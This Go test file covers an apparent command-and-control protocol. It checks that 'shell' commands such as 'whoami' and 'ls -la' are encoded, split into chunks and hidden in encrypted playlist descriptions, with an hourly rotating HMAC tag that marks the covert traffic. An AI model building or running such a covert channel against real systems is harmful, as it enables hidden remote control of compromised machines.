package protocol

import (
	"fmt"
	"testing"
)

func TestEncodeDecodeMessage(t *testing.T) {
	key := "test-protocol-key"
	msg := map[string]interface{}{
		"module": "shell",
		"args":   map[string]interface{}{"cmd": "whoami"},
		"seq":    float64(1),
		"ts":     float64(1234567890),
	}

	encoded, err := EncodeMessage(msg, key)
	if err != nil {
		t.Fatalf("encode: %v", err)
	}

	decoded, err := DecodeMessage(encoded, key)
	if err != nil {
		t.Fatalf("decode: %v", err)
	}

	if getString(decoded, "module") != "shell" {
		t.Errorf("module: got %v, want shell", decoded["module"])
	}
	if getInt(decoded, "seq") != 1 {
		t.Errorf("seq: got %v, want 1", decoded["seq"])
	}
}

func TestChunkPayloadAndReassemble(t *testing.T) {
	key := "test-chunk-key"

	// Create a payload larger than C2_EFFECTIVE_CHUNK (300)
	payload := ""
	for i := 0; i < 400; i++ {
		payload += "A"
	}

	chunks, err := ChunkPayload(payload, 1, ChannelCmd, key)
	if err != nil {
		t.Fatalf("chunk: %v", err)
	}

	if len(chunks) < 2 {
		t.Errorf("expected at least 2 chunks, got %d", len(chunks))
	}

	// Simulate reading back
	var descs []DescPair
	for i, c := range chunks {
		descs = append(descs, DescPair{
			PlaylistID:  fmt.Sprintf("pl-%d", i),
			Description: c,
		})
	}

	seqGroups := ReadC2Descriptions(descs, key, ChannelCmd, 1)
	if len(seqGroups) != 1 {
		t.Fatalf("expected 1 seq group, got %d", len(seqGroups))
	}

	chunkMetas := seqGroups[1]
	reassembled := ReassemblePayload(chunkMetas)
	if reassembled != payload {
		t.Errorf("reassembled payload mismatch: got len %d, want len %d", len(reassembled), len(payload))
	}
}

func TestEncryptDecryptChunkDesc(t *testing.T) {
	key := "test-desc-key"
	meta := map[string]interface{}{
		"c":   "cmd",
		"i":   1,
		"seq": 42,
	}
	chunkData := "SGVsbG8gV29ybGQ="

	desc, err := EncryptChunkDesc(meta, chunkData, key)
	if err != nil {
		t.Fatalf("encrypt: %v", err)
	}

	// Verify tag prefix
	expectedTag := ComputeC2Tag(key)
	if desc[:len(expectedTag)] != expectedTag {
		t.Errorf("tag mismatch")
	}

	gotMeta, gotData, err := DecryptChunkDesc(desc, key)
	if err != nil {
		t.Fatalf("decrypt: %v", err)
	}

	if gotData != chunkData {
		t.Errorf("data: got %q, want %q", gotData, chunkData)
	}
	if getMetaInt(gotMeta, "seq") != 42 {
		t.Errorf("seq: got %v, want 42", gotMeta["seq"])
	}
}

func TestC2TagTimeWindowed(t *testing.T) {
	// Tag is time-windowed: HMAC-SHA256(key, floor(epoch/3600))[:12]
	tag := ComputeC2Tag("test-c2-key")
	if len(tag) != 12 {
		t.Errorf("c2 tag length: got %d, want 12", len(tag))
	}
	// Same key should produce same tag within the same hour window
	tag2 := ComputeC2Tag("test-c2-key")
	if tag != tag2 {
		t.Errorf("c2 tag not deterministic: got %s and %s", tag, tag2)
	}
	// Different key should produce different tag
	tag3 := ComputeC2Tag("different-key")
	if tag == tag3 {
		t.Errorf("different keys produced same tag: %s", tag)
	}
	// ComputeC2Tags should return current tag as first element
	tags := ComputeC2Tags("test-c2-key")
	if tags[0] != tag {
		t.Errorf("ComputeC2Tags[0] != ComputeC2Tag: got %s, want %s", tags[0], tag)
	}
	if tags[0] == tags[1] {
		// This can only happen at hour boundary, very unlikely in tests
		t.Log("current and previous tags are identical (hour boundary)")
	}
}

func TestC2MessageRoundtrip(t *testing.T) {
	msg := NewC2Message("shell", 5)
	msg.Args = map[string]interface{}{"cmd": "ls -la"}

	cmdMap := msg.ToCommandMap()
	restored := FromCommandMap(cmdMap)

	if restored.Module != "shell" {
		t.Errorf("module: got %s, want shell", restored.Module)
	}
	if restored.Seq != 5 {
		t.Errorf("seq: got %d, want 5", restored.Seq)
	}

	// Result roundtrip
	result := NewC2Message("shell", 5)
	result.Status = "ok"
	result.Data = "total 42"

	resMap := result.ToResultMap()
	restoredRes := FromResultMap(resMap)

	if restoredRes.Status != "ok" {
		t.Errorf("status: got %s, want ok", restoredRes.Status)
	}
	if restoredRes.Data != "total 42" {
		t.Errorf("data: got %s, want 'total 42'", restoredRes.Data)
	}
}
